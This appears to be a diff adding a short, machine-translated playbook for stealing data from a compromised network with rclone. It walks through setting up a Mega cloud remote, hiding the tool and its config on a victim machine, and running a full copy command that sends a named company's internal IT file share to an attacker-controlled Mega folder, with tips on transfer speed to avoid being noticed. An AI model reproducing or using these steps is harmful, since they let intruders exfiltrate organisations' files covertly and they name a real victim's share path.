@@ -1,0 +1,17 @@
+Rclone
+in order to start downloading via rclone you need to create a config
+to create a config you need to open cmd go to the directory where rclone.exe is located
+run rclone.exe using the command: rclone config
+then select new remote in the menu that appears
+we call it mega then we enter mega again
+after that we enter the mail address mega after he asks for his pass to enter or generate we choose our letter 'Y'
+the pass will not appear when inserted, however it is inserted there anyway
+after creating the config, we are thrown into the main menu and we exit the clone.
+then we enter this command rclone.exe config show it will show the config itself that we created
+we copy it and create the rclone.conf file where we put this info.
+after we found the balls we are interested in, we load the exe and the config on the target machine with the rights, we hide the config and the executable so that they are not found
+go to the directory of the executable and give the command: 
+shell rclone.exe copy "\\envisionpharma.com\IT\KLSHARE" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+where: \\envisionpharma.com\IT\KLSHARE are balls
+Mega: Finanse the location of the files in the mega (you can create a folder in the mega yourself, you just need to specify it here)
+streams 12 --transfers 12 is the number of streams that pump to the maximum (12) I do not recommend as you can easily get burned
